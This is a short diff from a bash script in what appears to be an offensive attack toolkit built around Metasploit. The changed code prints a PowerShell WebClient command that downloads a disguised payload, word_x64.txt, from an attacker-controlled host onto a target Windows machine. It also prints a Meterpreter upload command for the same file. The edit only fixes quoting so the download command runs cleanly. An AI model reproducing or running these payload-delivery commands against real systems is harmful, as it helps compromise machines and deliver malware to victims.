@@ -1533,7 +1533,7 @@ do
 	chown www-data:www-data /var/www/html/word_x64.txt
 	read -p 'Set LHOST IP or Domain Name & Port (if necessary i.e., 1.1.1.1 OR 1.1.1.1:8080): ' userhost; read -p 'Enter File Destination Full Path on Target Machine for MSF (Recommended: %USERPROFILE%\\\\\\word_x64.exe): ' msfuserpath; read -p 'Enter File Destination Full Path on Target Machine for PSH (Recommended: %USERPROFILE%\\word_x64.exe): ' pshuserpath;
 		echo -e "\E[1;34m::::: \e[97mWindows Terminal Command \E[1;34m:::::" 
-		echo -e "\E[1;34m\e[97m \e[31m powershell \(new-object System.Net.WebClient\).DownloadFile\(\'http://$userhost/word_x64.txt\',\'$pshuserpath\'\)\e[97m\E[1;34m"
+		echo -e "\E[1;34m\e[97m \e[31m powershell (new-object System.Net.WebClient).DownloadFile('http://$userhost/word_x64.txt','$pshuserpath')\e[97m\E[1;34m"
 			
         echo -e "\E[1;34m::::: \e[97mMeterpreter Command \E[1;34m:::::" 
         echo -e "\E[1;34m\e[97m \e[31m upload /root/ATAT/word_x64.txt $msfuserpath \e[97m\E[1;34m"
